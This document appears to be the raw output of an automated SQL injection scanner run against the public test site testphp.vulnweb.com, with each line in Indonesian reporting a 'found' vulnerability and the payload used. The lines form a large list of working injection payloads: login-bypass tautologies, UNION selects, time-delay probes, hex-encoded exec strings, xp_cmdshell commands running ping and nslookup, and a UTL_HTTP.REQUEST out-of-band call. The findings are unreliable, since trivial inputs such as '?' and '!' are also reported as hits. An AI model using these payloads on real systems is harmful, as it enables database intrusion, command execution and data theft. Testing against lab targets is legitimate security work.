+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%2A%28%7C%28mail%3D%2A%29%29 dengan payload: %2A%28%7C%28mail%3D%2A%29%29
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=#NAME? dengan payload: #NAME?
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1 /* dengan payload:  or 1=1 /*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=)) or sleep(__TIME__)=' dengan payload: )) or sleep(__TIME__)='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or 1=1 or ""= dengan payload: or 1=1 or ""=
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1 in (select @@version)-- dengan payload:  or 1 in (select @@version)--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=sqlvuln; dengan payload: sqlvuln;
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= union select * from users where login = char ... dengan payload:  union select * from users where login = char ...
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=x' or 1=1 or 'x'='y dengan payload: x' or 1=1 or 'x'='y
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=28% dengan payload: 28%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=â or 3=3 -- dengan payload: â or 3=3 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=@variable dengan payload: @variable
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or '1'='1'-- dengan payload:  or '1'='1'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=a" or 1=1-- dengan payload: a" or 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=//* dengan payload: //*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=%2A%7C dengan payload: %2A%7C
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=" or 0=0 -- dengan payload: " or 0=0 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=)) or pg_sleep(__TIME__)--" dengan payload: )) or pg_sleep(__TIME__)--"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=? dengan payload: ?
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1/* dengan payload:  or 1/*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=! dengan payload: !
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' dengan payload: '
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or a = a dengan payload:  or a = a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q) dengan payload: declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  dengan payload: declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q) dengan payload: declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) dengan payload: declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 1=1 dengan payload: ' or 1=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1 -- dengan payload:  or 1=1 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=x' OR full_name LIKE '%Bob% dengan payload: x' OR full_name LIKE '%Bob%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='; exec master..xp_cmdshell 'ping 172.10.1.255'-- dengan payload: '; exec master..xp_cmdshell 'ping 172.10.1.255'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='%20or%20''=' dengan payload: '%20or%20''='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='%20or%20'x'='x dengan payload: '%20or%20'x'='x
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=')%20or%20('x'='x dengan payload: ')%20or%20('x'='x
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 0=0 -- dengan payload: ' or 0=0 --
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 0=0 # dengan payload: ' or 0=0 #
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 0=0 #" dengan payload:  or 0=0 #"
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 1=1-- dengan payload: ' or 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or '1'='1'-- dengan payload: ' or '1'='1'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 1 --' dengan payload: ' or 1 --'
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or 1=1-- dengan payload: or 1=1--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 1=1 or ''=' dengan payload: ' or 1=1 or ''='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or 1=1 or ""= dengan payload:  or 1=1 or ""=
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or a=a-- dengan payload: ' or a=a--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id= or a=a dengan payload:  or a=a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=') or ('a'='a dengan payload: ') or ('a'='a
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='hi' or 'x'='x'; dengan payload: 'hi' or 'x'='x';
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=or dengan payload: or
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=procedure dengan payload: procedure
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=handler dengan payload: handler
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or username like '% dengan payload: ' or username like '%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or uname like '% dengan payload: ' or uname like '%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or userid like '% dengan payload: ' or userid like '%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or uid like '% dengan payload: ' or uid like '%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or user like '% dengan payload: ' or user like '%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='; exec master..xp_cmdshell dengan payload: '; exec master..xp_cmdshell
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='; exec xp_regread dengan payload: '; exec xp_regread
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=t'exec master..xp_cmdshell 'nslookup www.google.com'-- dengan payload: t'exec master..xp_cmdshell 'nslookup www.google.com'--
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' UNION SELECT dengan payload: ' UNION SELECT
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' UNION ALL SELECT dengan payload: ' UNION ALL SELECT
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or (EXISTS) dengan payload: ' or (EXISTS)
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' (select top 1 dengan payload: ' (select top 1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='||UTL_HTTP.REQUEST dengan payload: '||UTL_HTTP.REQUEST
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=1;SELECT%20* dengan payload: 1;SELECT%20*
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=<>"'%;)(&+ dengan payload: <>"'%;)(&+
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='%20or%201=1 dengan payload: '%20or%201=1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id='sqlattempt1 dengan payload: 'sqlattempt1
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=29% dengan payload: 29%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=26% dengan payload: 26%
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or ''=' dengan payload: ' or ''='
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 3=3 dengan payload: ' or 3=3
+Kerentanan SQL Injection ditemukan pada: http://testphp.vulnweb.com/artists.php?artist=1 ?id=' or 3=3 -- dengan payload: ' or 3=3 --
